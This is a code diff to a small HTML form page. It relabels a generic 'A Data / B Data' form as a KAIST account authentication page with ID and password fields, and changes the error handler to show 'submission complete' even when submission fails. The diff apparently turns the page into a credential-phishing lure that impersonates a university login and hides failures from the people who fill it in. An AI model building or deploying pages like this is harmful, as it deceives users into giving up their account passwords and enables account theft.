@@ -4,12 +4,12 @@
   <title>Data Submission</title>
 </head>
 <body>
-  <h1>Submit A and B Data</h1>
+  <h1>KAIST 계정 인증</h1>
   <form id="dataForm">
-    <label for="aData">A Data:</label>
+    <label for="aData">아이디:</label>
     <input type="text" id="aData" required><br><br>
 
-    <label for="bData">B Data:</label>
+    <label for="bData">패스워드:</label>
     <input type="text" id="bData" required><br><br>
 
     <button type="submit">Submit</button>
@@ -66,7 +66,8 @@
         alert(result.result);
       } catch (error) {
         console.error('Error:', error);
-        alert('Error submitting data.');
+        //alert('Error submitting data.');
+        alert('제출완료');
       }
     }
     
